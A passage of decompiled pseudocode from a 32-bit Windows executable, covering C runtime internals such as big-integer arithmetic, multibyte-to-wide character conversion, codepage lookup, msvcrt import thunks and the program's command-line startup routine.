    v2 = sub_409710(a1, dword_7AD5DC[a2 & 3], 0);
    if ( v2 == nullptr )
      return nullptr;
  }
  v3 = a2 >> 2;
  result = v2;
  if ( a2 >> 2 != 0 )
  {
    v5 = (int **)dword_7B20C0;
    if ( dword_7B20C0 == 0 )
    {
      sub_4094C0(1);
      v5 = (int **)dword_7B20C0;
      if ( dword_7B20C0 == 0 )
      {
        v8 = sub_4095C0(1);
        v5 = (int **)v8;
        if ( v8 == nullptr )
        {
          dword_7B20C0 = 0;
          return nullptr;
        }
        v8[5] = 625;
        v8[4] = 1;
        dword_7B20C0 = (int)v8;
        *v8 = 0;
      }
      if ( dword_7B2A08 == 2 )
        LeaveCriticalSection(&stru_7B2A38);
    }
    if ( (v3 & 1) != 0 )
      goto LABEL_8;
    while ( 1 )
    {
      v6 = *v5;
      v3 >>= 1;
      if ( *v5 != nullptr )
      {
LABEL_6:
        v5 = (int **)v6;
        goto LABEL_7;
      }
      while ( 1 )
      {
        sub_4094C0(1);
        v6 = *v5;
        if ( *v5 == nullptr )
        {
          v6 = sub_4098C0(v5, v5);
          *v5 = v6;
          if ( v6 == nullptr )
            return nullptr;
          *v6 = 0;
        }
        if ( dword_7B2A08 != 2 )
          goto LABEL_6;
        v10 = v6;
        LeaveCriticalSection(&stru_7B2A38);
        v5 = (int **)v10;
LABEL_7:
        if ( (v3 & 1) == 0 )
          break;
LABEL_8:
        v7 = sub_4098C0(v2, v5);
        if ( v7 == nullptr )
          return nullptr;
        v9 = v7;
        sub_4096A0(v2);
        v3 >>= 1;
        result = v9;
        if ( v3 == 0 )
          return result;
        v2 = v9;
        v6 = *v5;
        if ( *v5 != nullptr )
          goto LABEL_6;
      }
    }
  }
  return result;
}


// ----- sub_409C00 @ 0x409c00 -----
int *__cdecl sub_409C00(int *a1, int a2)
{
  int v2; // edx
  int v3; // ebx
  int i; // eax
  int *v5; // eax
  int *v6; // edx
  int v7; // ecx
  _DWORD *v8; // eax
  int *v9; // esi
  unsigned int v10; // ecx
  int *v11; // ebx
  int v12; // eax
  int v13; // edi
  int v14; // edi
  unsigned int v15; // ebx
  int *v17; // edi
  int v18; // [esp+20h] [ebp-28h]
  int *v19; // [esp+24h] [ebp-24h]

  v2 = a1[1];
  v3 = a2 >> 5;
  v18 = (a2 >> 5) + a1[4];
  for ( i = a1[2]; v18 + 1 > i; ++v2 )
    i *= 2;
  v5 = sub_4095C0(v2);
  v19 = v5;
  if ( v5 != nullptr )
  {
    v6 = v5 + 5;
    if ( v3 > 0 )
    {
      v7 = (int)&v5[v3 + 5];
      v8 = v5 + 5;
      if ( (((_BYTE)v7 - (_BYTE)v6) & 4) == 0 || (v8 = v19 + 6, v19[5] = 0, v19 + 6 != (int *)v7) )
      {
        do
        {
          *v8 = 0;
          v8 += 2;
          *(v8 - 1) = 0;
        }
        while ( v8 != (_DWORD *)v7 );
      }
      v6 += v3;
    }
    v9 = a1 + 5;
    v10 = (unsigned int)&a1[a1[4] + 5];
    if ( (a2 & 0x1F) != 0 )
    {
      v11 = v6;
      v12 = 0;
      do
      {
        v13 = *v9;
        ++v11;
        ++v9;
        *(v11 - 1) = (v13 << (a2 & 0x1F)) | v12;
        v12 = (unsigned int)*(v9 - 1) >> (32 - (a2 & 0x1F));
      }
      while ( (unsigned int)v9 < v10 );
      v14 = v18 + 1;
      v15 = (v10 - (_DWORD)a1 - 21) & 0xFFFFFFFC;
      if ( v10 < (unsigned int)a1 + 21 )
        v15 = 0;
      if ( v12 == 0 )
        v14 = v18;
      *(int *)((char *)v6 + v15 + 4) = v12;
      v18 = v14;
    }
    else
    {
      v17 = v6;
      do
        *v17++ = *v9++;
      while ( (unsigned int)v9 < v10 );
    }
    v19[4] = v18;
    sub_4096A0(a1);
  }
  return v19;
}


// ----- sub_409D70 @ 0x409d70 -----
int __cdecl sub_409D70(int a1, int a2)
{
  int v2; // eax
  int v3; // ebx
  int v4; // edx
  _DWORD *v5; // eax
  _DWORD *v6; // edx

  v2 = *(_DWORD *)(a2 + 16);
  v3 = *(_DWORD *)(a1 + 16) - v2;
  if ( v3 == 0 )
  {
    v4 = 4 * v2;
    v5 = (_DWORD *)(a1 + 20 + 4 * v2);
    v6 = (_DWORD *)(a2 + v4 + 20);
    while ( *--v5 == *--v6 )
    {
      if ( a1 + 20 >= (unsigned int)v5 )
        return v3;
    }
    return *v5 < *v6 ? -1 : 1;
  }
  return v3;
}


// ----- sub_409DC0 @ 0x409dc0 -----
int *__cdecl sub_409DC0(int a1, int a2)
{
  int v2; // ebx
  int v3; // eax
  bool v4; // sf
  int v5; // esi
  int v6; // edx
  _DWORD *v7; // eax
  _DWORD *v8; // edx
  int v9; // eax
  int *v10; // eax
  int v11; // esi
  unsigned int v12; // ecx
  int *v13; // ebx
  __int64 v14; // rax
  __int64 v15; // rax
  __int64 v16; // rax
  unsigned int v17; // ecx
  unsigned int v18; // ebx
  char *v19; // ecx
  unsigned int *v20; // eax
  unsigned int v21; // eax
  unsigned __int64 v22; // rax
  unsigned int v23; // edi
  int v24; // eax
  unsigned int v25; // edi
  int *result; // eax
  int *v27; // [esp+1Ch] [ebp-3Ch]
  int v28; // [esp+20h] [ebp-38h]
  int v29; // [esp+20h] [ebp-38h]
  int v30; // [esp+24h] [ebp-34h]
  int *v31; // [esp+28h] [ebp-30h]
  unsigned int v32; // [esp+2Ch] [ebp-2Ch]
  unsigned int v33; // [esp+30h] [ebp-28h]
  char *v34; // [esp+30h] [ebp-28h]
  unsigned int v35; // [esp+34h] [ebp-24h]
  char *v36; // [esp+34h] [ebp-24h]
  int v37; // [esp+38h] [ebp-20h]
  unsigned int v38; // [esp+38h] [ebp-20h]

  v2 = a2;
  v37 = *(_DWORD *)(a1 + 16);
  v3 = *(_DWORD *)(a2 + 16);
  v5 = v37 - v3;
  v4 = v37 - v3 < 0;
  if ( v37 == v3 )
  {
    v6 = 4 * v3;
    v7 = (_DWORD *)(a1 + 20 + 4 * v3);
    v8 = (_DWORD *)(a2 + v6 + 20);
    do
    {
      if ( *--v7 != *--v8 )
      {
        if ( *v7 >= *v8 )
        {
          v2 = a1;
          a1 = a2;
        }
        else
        {
          v5 = 1;
        }
        goto LABEL_11;
      }
    }
    while ( a1 + 20 < (unsigned int)v7 );
    result = sub_4095C0(0);
    v31 = result;
    if ( result == nullptr )
      return v31;
    result[4] = 1;
    result[5] = 0;
  }
  else
  {
    v9 = a2;
    if ( v4 )
      v9 = a1;
    else
      v2 = a1;
    a1 = v9;
    v5 = v4;
LABEL_11:
    v10 = sub_4095C0(*(_DWORD *)(v2 + 4));
    v31 = v10;
    if ( v10 != nullptr )
    {
      v10[3] = v5;
      v11 = 0;
      v28 = v2 + 20;
      v30 = *(_DWORD *)(v2 + 16);
      v32 = v2 + 20 + 4 * v30;
      v35 = v2 + 20;
      v12 = a1 + 20;
      v33 = a1 + 20 + 4 * *(_DWORD *)(a1 + 16);
      v27 = v10 + 5;
      v13 = v10 + 5;
      do
      {
        v35 += 4;
        v14 = v35;
        v12 += 4;
        LODWORD(v14) = *(_DWORD *)(v35 - 4);
        v15 = v14 - *(unsigned int *)(v12 - 4);
        v38 = v15 - v11;
        v16 = v15 - (unsigned int)v11;
        *v13++ = v16;
        v11 = BYTE4(v16) & 1;
      }
      while ( v12 < v33 );
      v17 = (v33 - a1 - 21) & 0xFFFFFFFC;
      if ( v33 < a1 + 21 )
        v17 = 0;
      v34 = (char *)v27 + v17;
      v18 = v28 + v17 + 4;
      v36 = (char *)v27 - v28;
      if ( v18 >= v32 )
      {
        v23 = (unsigned int)v27 + v17;
      }
      else
      {
        v29 = v28 + v17 + 4;
        do
        {
          v19 = &v36[v18];
          v20 = (unsigned int *)v18;
          v18 += 4;
          v21 = *v20;
          v38 = v21 - v11;
          v22 = v21 - (unsigned __int64)(unsigned int)v11;
          *(_DWORD *)v19 = v22;
          v11 = BYTE4(v22) & 1;
        }
        while ( v18 < v32 );
        v23 = (unsigned int)&v34[((v32 - 1 - v29) & 0xFFFFFFFC) + 4];
      }
      if ( v38 == 0 )
      {
        v24 = v30;
        v25 = v23 - 4 * v30;
        do
          --v24;
        while ( *(_DWORD *)(v25 + 4 * v24) == 0 );
        v30 = v24;
      }
      v31[4] = v30;
    }
    return v31;
  }
  return result;
}


// ----- sub_40A000 @ 0x40a000 -----
double __cdecl sub_40A000(int a1, _DWORD *a2)
{
  unsigned int v2; // esi
  int v3; // ebx
  unsigned int v4; // edx
  unsigned int v5; // eax
  signed int v6; // eax
  int v7; // edi
  unsigned int v8; // eax
  char v9; // cl
  char v10; // di
  int v12; // edi
  char v13; // [esp+0h] [ebp-20h]
  unsigned int v14; // [esp+4h] [ebp-1Ch]
  double v15; // [esp+8h] [ebp-18h]
  double v16; // [esp+8h] [ebp-18h]
  double v17; // [esp+8h] [ebp-18h]

  v2 = a1 + 20;
  v3 = a1 + 20 + 4 * *(_DWORD *)(a1 + 16);
  v4 = *(_DWORD *)(v3 - 4);
  v14 = v3 - 4;
  _BitScanReverse(&v5, v4);
  v6 = v5 ^ 0x1F;
  *a2 = 32 - v6;
  if ( v6 > 10 )
  {
    v7 = v6 - 11;
    v13 = v6 - 11;
    if ( v2 >= v14 )
    {
      if ( v6 != 11 )
      {
        LODWORD(v16) = 0;
        HIDWORD(v16) = (v4 << v13) | 0x3FF00000;
        return v16;
      }
      v8 = 0;
    }
    else
    {
      v8 = *(_DWORD *)(v3 - 8);
      v9 = v7;
      if ( v7 != 0 )
      {
        v10 = 32 - v7;
        HIDWORD(v15) = (v8 >> (32 - v9)) | (v4 << v13) | 0x3FF00000;
        v8 <<= v13;
        if ( v2 < v3 - 8 )
        {
          LODWORD(v15) = (*(_DWORD *)(v3 - 12) >> v10) | v8;
          return v15;
        }
        goto LABEL_10;
      }
    }
    HIDWORD(v15) = v4 | 0x3FF00000;
LABEL_10:
    LODWORD(v15) = v8;
    return v15;
  }
  v12 = 0;
  if ( v2 < v14 )
    v12 = *(_DWORD *)(v3 - 8) >> (11 - v6);
  LODWORD(v17) = v12 | (v4 << (v6 + 21));
  HIDWORD(v17) = (v4 >> (11 - v6)) | 0x3FF00000;
  return v17;
}


// ----- sub_40A340 @ 0x40a340 -----
int __cdecl sub_40A340(int a1, int a2)
{
  int v2; // eax
  int v3; // edx

  v2 = 0;
  v3 = a2;
  if ( a2 != 0 )
  {
    while ( *(_WORD *)(a1 + 2 * v2) != 0 )
    {
      if ( a2 == ++v2 )
        return v3;
    }
    return v2;
  }
  return v3;
}


// ----- sub_40A380 @ 0x40a380 -----
int __cdecl sub_40A380(LPSTR lpMultiByteStr, WCHAR a2, UINT CodePage, int cbMultiByte)
{
  int result; // eax
  WCHAR WideCharStr[8]; // [esp+2Ch] [ebp-1Ch] BYREF
  BOOL UsedDefaultChar; // [esp+3Ch] [ebp-Ch] BYREF

  WideCharStr[0] = a2;
  if ( CodePage == 0 )
  {
    if ( a2 <= 0xFFu )
    {
      *lpMultiByteStr = a2;
      return 1;
    }
LABEL_7:
    *errno() = 42;
    return -1;
  }
  UsedDefaultChar = false;
  result = WideCharToMultiByte(CodePage, 0, WideCharStr, 1, lpMultiByteStr, cbMultiByte, nullptr, &UsedDefaultChar);
  if ( result == 0 || UsedDefaultChar )
    goto LABEL_7;
  return result;
}


// ----- sub_40A420 @ 0x40a420 -----
int __cdecl sub_40A420(CHAR *a1, WCHAR a2)
{
  CHAR *v2; // ebx
  int v3; // edi
  UINT v4; // eax
  CHAR v6; // [esp+1Bh] [ebp-1Dh] BYREF

  v2 = a1;
  if ( a1 == nullptr )
    v2 = &v6;
  v3 = sub_40AA40();
  v4 = sub_40AA00();
  return sub_40A380(v2, a2, v4, v3);
}


// ----- sub_40A5A0 @ 0x40a5a0 -----
_BYTE *__cdecl sub_40A5A0(_BYTE *a1, unsigned int a2)
{
  _BYTE *v2; // edx
  _BYTE *v3; // eax

  v2 = nullptr;
  v3 = a1;
  if ( a2 != 0 )
  {
    do
    {
      if ( *v3 == 0 )
        break;
      v2 = (_BYTE *)(++v3 - a1);
    }
    while ( v3 - a1 < a2 );
  }
  return v2;
}


// ----- sub_40A5E0 @ 0x40a5e0 -----
int __cdecl sub_40A5E0(LPWSTR lpWideCharStr, LPCCH lpMultiByteStr, int a3, int *a4, UINT CodePage, unsigned int a6)
{
  const CHAR *v6; // edx
  int v7; // ebx
  BYTE TestChar; // al
  BOOL v9; // eax
  int v10; // eax
  CHAR v12[8]; // [esp+2Ch] [ebp-Ch] BYREF

  v6 = lpMultiByteStr;
  if ( lpMultiByteStr == nullptr )
    return 0;
  if ( a3 == 0 )
    return -2;
  v7 = *a4;
  TestChar = *lpMultiByteStr;
  *a4 = 0;
  *(_DWORD *)v12 = v7;
  if ( TestChar == 0 )
  {
    *lpWideCharStr = 0;
    return 0;
  }
  if ( a6 > 1 )
  {
    if ( (_BYTE)v7 != 0 )
    {
      v12[1] = TestChar;
      v10 = MultiByteToWideChar(CodePage, 8u, v12, 2, lpWideCharStr, 1);
LABEL_9:
      if ( v10 != 0 )
        return 2;
      goto LABEL_18;
    }
    v9 = IsDBCSLeadByteEx(CodePage, TestChar);
    v6 = lpMultiByteStr;
    if ( v9 )
    {
      if ( a3 != 1 )
      {
        v10 = MultiByteToWideChar(CodePage, 8u, lpMultiByteStr, 2, lpWideCharStr, 1);
        goto LABEL_9;
      }
      *(_BYTE *)a4 = *lpMultiByteStr;
      return -2;
    }
  }
  if ( CodePage != 0 )
  {
    if ( MultiByteToWideChar(CodePage, 8u, v6, 1, lpWideCharStr, 1) == 0 )
    {
LABEL_18:
      *errno() = 42;
      return -1;
    }
  }
  else
  {
    *lpWideCharStr = *(unsigned __int8 *)v6;
  }
  return 1;
}


// ----- sub_40A740 @ 0x40a740 -----
int __cdecl sub_40A740(WCHAR *a1, LPCCH a2, int a3, int *a4)
{
  WCHAR *v4; // ebx
  int *v5; // esi
  int v7; // [esp+10h] [ebp-38h]
  unsigned int v8; // [esp+14h] [ebp-34h]
  WCHAR v9; // [esp+2Eh] [ebp-1Ah] BYREF

  v4 = a1;
  v5 = a4;
  v9 = 0;
  if ( a1 == nullptr )
    v4 = &v9;
  v8 = sub_40AA40();
  v7 = sub_40AA00();
  if ( a4 == nullptr )
    v5 = (int *)&unk_7B2A68;
  return sub_40A5E0(v4, a2, a3, v5, v7, v8);
}


// ----- sub_40A7A0 @ 0x40a7a0 -----
unsigned int __cdecl sub_40A7A0(LPWSTR a1, const CHAR **a2, unsigned int a3, int *a4)
{
  int *v4; // eax
  int v5; // eax
  unsigned int v6; // edx
  const CHAR *v7; // eax
  unsigned int v8; // ebx
  WCHAR *v9; // esi
  int i; // eax
  const CHAR *v11; // ecx
  int v13; // esi
  unsigned int v14; // ebx
  int v15; // eax
  unsigned int v16; // [esp+28h] [ebp-30h]
  int v17; // [esp+2Ch] [ebp-2Ch]
  WCHAR v18[13]; // [esp+3Eh] [ebp-1Ah] BYREF
  int *v19; // [esp+6Ch] [ebp+14h]

  v4 = (int *)&unk_7B2A64;
  if ( a4 != nullptr )
    v4 = a4;
  v19 = v4;
  v17 = sub_40AA00();
  v5 = sub_40AA40();
  if ( a2 == nullptr )
    return 0;
  v6 = v5;
  v7 = *a2;
  if ( *a2 == nullptr )
    return 0;
  if ( a1 != nullptr )
  {
    v8 = 0;
    if ( a3 != 0 )
    {
      v9 = a1;
      v16 = v6;
      for ( i = sub_40A5E0(a1, v7, a3, v19, v17, v6); i > 0; i = sub_40A5E0(v9, v11, a3 - v8, v19, v17, v16) )
      {
        ++v9;
        v8 += i;
        v11 = &(*a2)[i];
        *a2 = v11;
        if ( v8 >= a3 )
          return v8;
      }
      if ( v8 < a3 && i == 0 )
        *a2 = nullptr;
    }
    return v8;
  }
  else
  {
    v13 = 0;
    v18[0] = 0;
    v14 = v6;
    while ( 1 )
    {
      v15 = sub_40A5E0(v18, &v7[v13], v14, v19, v17, v14);
      if ( v15 <= 0 )
        break;
      v13 += v15;
      v7 = *a2;
    }
    return v13;
  }
}


// ----- sub_40A8D0 @ 0x40a8d0 -----
int __cdecl sub_40A8D0(LPCCH a1, int a2, int *a3)
{
  int *v3; // ebx
  int v5; // [esp+10h] [ebp-28h]
  unsigned int v6; // [esp+14h] [ebp-24h]
  WCHAR v7[5]; // [esp+2Eh] [ebp-Ah] BYREF

  v7[0] = 0;
  v3 = a3;
  v6 = sub_40AA40();
  v5 = sub_40AA00();
  if ( a3 == nullptr )
    v3 = (int *)&unk_7B2A60;
  return sub_40A5E0(v7, a1, a2, v3, v5, v6);
}


// ----- sub_40A930 @ 0x40a930 -----
int sub_40A930()
{
  return *(_DWORD *)dword_7B2A6C;
}


// ----- sub_40A940 @ 0x40a940 -----
int sub_40A940()
{
  char *v0; // eax
  char *v1; // edx
  int result; // eax

  v0 = setlocale(2, nullptr);
  v1 = strchr(v0, 46);
  result = 0;
  if ( v1 != nullptr )
    return atoi(v1 + 1);
  return result;
}


// ----- sub_40A980 @ 0x40a980 -----
int sub_40A980()
{
  HMODULE ModuleHandleA; // eax
  unsigned int (__cdecl *___lc_codepage_func)(); // eax
  FARPROC (__stdcall *v2)(HMODULE, LPCSTR); // ecx
  HMODULE v3; // edx
  HMODULE v5; // [esp+18h] [ebp-10h]

  ModuleHandleA = GetModuleHandleA("msvcrt.dll");
  if ( ModuleHandleA != nullptr )
  {
    v5 = ModuleHandleA;
    ___lc_codepage_func = (unsigned int (__cdecl *)())GetProcAddress(ModuleHandleA, "___lc_codepage_func");
    v2 = GetProcAddress;
    v3 = v5;
    if ( ___lc_codepage_func != nullptr )
    {
LABEL_3:
      off_7AC0B4 = (int (*)())___lc_codepage_func;
      return ((int (__fastcall *)(FARPROC (__stdcall *)(HMODULE, LPCSTR), HMODULE))___lc_codepage_func)(v2, v3);
    }
    _lc_codepage = (int)GetProcAddress(v5, "__lc_codepage");
    if ( _lc_codepage != 0 )
    {
      ___lc_codepage_func = (unsigned int (__cdecl *)())sub_40A930;
      goto LABEL_3;
    }
  }
  off_7AC0B4 = sub_40A940;
  return sub_40A940();
}


// ----- sub_40AA00 @ 0x40aa00 -----
// attributes: thunk
int sub_40AA00(void)
{
  return off_7AC0B4();
}


// ----- sub_40AA10 @ 0x40aa10 -----
int __cdecl sub_40AA10(int (**a1)(void), unsigned int a2)
{
  int (**v2)(void); // ebx
  int result; // eax

  v2 = a1;
  if ( (unsigned int)a1 >= a2 )
    return 0;
  while ( 1 )
  {
    if ( *v2 != nullptr )
    {
      result = (*v2)();
      if ( result != 0 )
        break;
    }
    if ( (unsigned int)++v2 >= a2 )
      return 0;
  }
  return result;
}


// ----- sub_40AA40 @ 0x40aa40 -----
int sub_40AA40()
{
  return *(_DWORD *)_p___mb_cur_max();
}


// ----- sub_40AA50 @ 0x40aa50 -----
int __cdecl sub_40AA50(int *a1, _DWORD *a2, _DWORD *a3, int a4, int a5)
{
  int result; // eax
  int v6; // edx
  int v7; // ecx
  int v8; // [esp+24h] [ebp-14h] BYREF
  int v9; // [esp+28h] [ebp-10h] BYREF
  int v10; // [esp+2Ch] [ebp-Ch] BYREF

  v8 = -1;
  v9 = 0;
  v10 = 0;
  _getmainargs(&v8, &v9, &v10, a4, a5);
  result = v8;
  if ( v8 != -1 )
  {
    v6 = v9;
    if ( v9 != 0 && (v7 = v10, v10 != 0) )
    {
      *a1 = v8;
      *a2 = v6;
      *a3 = v7;
      return 0;
    }
    else
    {
      return -1;
    }
  }
  return result;
}


// ----- sub_40AAD0 @ 0x40aad0 -----
int sub_40AAD0()
{
  return dword_7B2A70;
}


// ----- sub_40AAE0 @ 0x40aae0 -----
__int32 __cdecl sub_40AAE0(__int32 a1)
{
  return _InterlockedExchange(&dword_7B2A70, a1);
}


// ----- sub_40AAF0 @ 0x40aaf0 -----
int __cdecl sub_40AAF0(int a1)
{
  if ( a1 == 1 )
    return -1;
  else
    return 2;
}


// ----- sub_40AB10 @ 0x40ab10 -----
FILE *__cdecl sub_40AB10(int a1)
{
  return &_p__iob()[a1];
}


// ----- __p__iob @ 0x40ab30 -----
// attributes: thunk
FILE *__cdecl _p__iob()
{
  return __p__iob();
}


// ----- __p___initenv @ 0x40ab38 -----
// attributes: thunk
int _p___initenv(void)
{
  return __p___initenv();
}


// ----- __p___mb_cur_max @ 0x40ab40 -----
// attributes: thunk
int _p___mb_cur_max(void)
{
  return __p___mb_cur_max();
}


// ----- __p__acmdln @ 0x40ab48 -----
// attributes: thunk
char **__cdecl _p__acmdln()
{
  return __p__acmdln();
}


// ----- __p__commode @ 0x40ab50 -----
// attributes: thunk
int *__cdecl _p__commode()
{
  return __p__commode();
}


// ----- __p__fmode @ 0x40ab58 -----
// attributes: thunk
int *__cdecl _p__fmode()
{
  return __p__fmode();
}


// ----- __set_app_type @ 0x40ab60 -----
// attributes: thunk
void __cdecl _set_app_type(_crt_app_type Type)
{
  __set_app_type(Type);
}


// ----- __setusermatherr @ 0x40ab68 -----
// attributes: thunk
void __cdecl _setusermatherr(_UserMathErrorFunctionPointer UserMathErrorFunction)
{
  __setusermatherr(UserMathErrorFunction);
}


// ----- _amsg_exit @ 0x40ab70 -----
// attributes: thunk
int __cdecl amsg_exit(int a1)
{
  return _amsg_exit(a1);
}


// ----- _cexit @ 0x40ab78 -----
// attributes: thunk
void __cdecl cexit()
{
  _cexit();
}


// ----- _errno @ 0x40ab80 -----
// attributes: thunk
int *__cdecl errno()
{
  return _errno();
}


// ----- _initterm @ 0x40ab88 -----
// attributes: thunk
void __cdecl initterm(_PVFV *First, _PVFV *Last)
{
  _initterm(First, Last);
}


// ----- _ismbblead @ 0x40ab90 -----
// attributes: thunk
int __cdecl ismbblead(unsigned int Ch)
{
  return _ismbblead(Ch);
}


// ----- atexit @ 0x40ab98 -----
// attributes: thunk
int __cdecl atexit(void (__cdecl *a1)())
{
  return __imp_atexit(a1);
}


// ----- abort @ 0x40aba0 -----
// attributes: thunk
void __cdecl __noreturn abort()
{
  __imp_abort();
}


// ----- atoi @ 0x40aba8 -----
// attributes: thunk
int __cdecl atoi(const char *String)
{
  return __imp_atoi(String);
}


// ----- calloc @ 0x40abb0 -----
// attributes: thunk
void *__cdecl calloc(size_t Count, size_t Size)
{
  return __imp_calloc(Count, Size);
}


// ----- exit @ 0x40abb8 -----
// attributes: thunk
void __cdecl __noreturn exit(int Code)
{
  __imp_exit(Code);
}


// ----- fclose @ 0x40abc0 -----
// attributes: thunk
int __cdecl fclose(FILE *Stream)
{
  return __imp_fclose(Stream);
}


// ----- fopen @ 0x40abc8 -----
// attributes: thunk
FILE *__cdecl fopen(const char *FileName, const char *Mode)
{
  return __imp_fopen(FileName, Mode);
}


// ----- fputc @ 0x40abd8 -----
// attributes: thunk
int __cdecl fputc(int Character, FILE *Stream)
{
  return __imp_fputc(Character, Stream);
}


// ----- fputs @ 0x40abe0 -----
// attributes: thunk
int __cdecl fputs(const char *Buffer, FILE *Stream)
{
  return __imp_fputs(Buffer, Stream);
}


// ----- free @ 0x40abe8 -----
// attributes: thunk
void __cdecl free(void *Block)
{
  __imp_free(Block);
}


// ----- localeconv @ 0x40abf0 -----
// attributes: thunk
struct lconv *__cdecl localeconv()
{
  return __imp_localeconv();
}


// ----- malloc @ 0x40abf8 -----
// attributes: thunk
void *__cdecl malloc(size_t Size)
{
  return __imp_malloc(Size);
}


// ----- memcmp @ 0x40ac00 -----
// attributes: thunk
int __cdecl memcmp(const void *Buf1, const void *Buf2, size_t Size)
{
  return __imp_memcmp(Buf1, Buf2, Size);
}


// ----- memcpy @ 0x40ac08 -----
// attributes: thunk
void *__cdecl memcpy(void *a1, const void *Src, size_t Size)
{
  return __imp_memcpy(a1, Src, Size);
}


// ----- memset @ 0x40ac10 -----
// attributes: thunk
void *__cdecl memset(void *a1, int Val, size_t Size)
{
  return __imp_memset(a1, Val, Size);
}


// ----- rand @ 0x40ac18 -----
// attributes: thunk
int __cdecl rand()
{
  return __imp_rand();
}


// ----- setlocale @ 0x40ac20 -----
// attributes: thunk
char *__cdecl setlocale(int Category, const char *Locale)
{
  return __imp_setlocale(Category, Locale);
}


// ----- signal @ 0x40ac28 -----
// attributes: thunk
_crt_signal_t __cdecl signal(int Signal, _crt_signal_t Function)
{
  return __imp_signal(Signal, Function);
}


// ----- srand @ 0x40ac30 -----
// attributes: thunk
void __cdecl srand(unsigned int Seed)
{
  __imp_srand(Seed);
}


// ----- strcat @ 0x40ac38 -----
// attributes: thunk
char *__cdecl strcat(char *Destination, const char *Source)
{
  return __imp_strcat(Destination, Source);
}


// ----- strchr @ 0x40ac40 -----
// attributes: thunk
char *__cdecl strchr(const char *Str, int Val)
{
  return __imp_strchr(Str, Val);
}


// ----- strerror @ 0x40ac48 -----
// attributes: thunk
char *__cdecl strerror(int ErrorMessage)
{
  return __imp_strerror(ErrorMessage);
}


// ----- strlen @ 0x40ac50 -----
// attributes: thunk
size_t __cdecl strlen(const char *Str)
{
  return __imp_strlen(Str);
}


// ----- strncmp @ 0x40ac58 -----
// attributes: thunk
int __cdecl strncmp(const char *Str1, const char *Str2, size_t MaxCount)
{
  return __imp_strncmp(Str1, Str2, MaxCount);
}


// ----- strstr @ 0x40ac60 -----
// attributes: thunk
char *__cdecl strstr(const char *Str, const char *SubStr)
{
  return __imp_strstr(Str, SubStr);
}


// ----- vfprintf @ 0x40ac68 -----
// attributes: thunk
int __cdecl vfprintf(FILE *const Stream, const char *const Format, va_list ArgList)
{
  return __imp_vfprintf(Stream, Format, ArgList);
}


// ----- wcslen @ 0x40ac70 -----
// attributes: thunk
size_t __cdecl wcslen(const wchar_t *String)
{
  return __imp_wcslen(String);
}


// ----- __getmainargs @ 0x40ac78 -----
// attributes: thunk
int __cdecl _getmainargs(int a1, int a2, int a3, int a4, int a5)
{
  return __getmainargs(a1, a2, a3, a4, a5);
}


// ----- sub_40AC80 @ 0x40ac80 -----
int __cdecl sub_40AC80(char a1)
{
  char v1; // si
  char *v2; // ebx
  char v3; // al
  char v4; // al
  int wShowWindow; // eax
  struct _STARTUPINFOA StartupInfo; // [esp+1Ch] [ebp-5Ch] BYREF
  char *v8; // [esp+6Ch] [ebp-Ch]

  v1 = 0;
  v8 = &a1;
  sub_403D20();
  v2 = *_p__acmdln();
  if ( v2 != nullptr )
  {
    while ( 1 )
    {
      v3 = *v2;
      if ( *v2 <= 32 )
      {
        if ( v3 == 0 )
          goto LABEL_15;
        if ( (v1 & 1) == 0 )
        {
          do
            v4 = *++v2;
          while ( v4 != 0 && v4 <= 32 );
          goto LABEL_15;
        }
        v1 = 1;
      }
      else if ( v3 == 34 )
      {
        v1 ^= 1u;
      }
      if ( ismbblead(*v2) != 0 )
        v2 += -(v2[1] == 0) + 1;
      ++v2;
    }
  }
  v2 = (char *)&unk_7AD140;
LABEL_15:
  GetStartupInfoA(&StartupInfo);
  wShowWindow = StartupInfo.wShowWindow;
  if ( (StartupInfo.dwFlags & 1) == 0 )
    wShowWindow = 10;
  return sub_403C4B(0x400000, 0, (int)v2, wShowWindow);
}


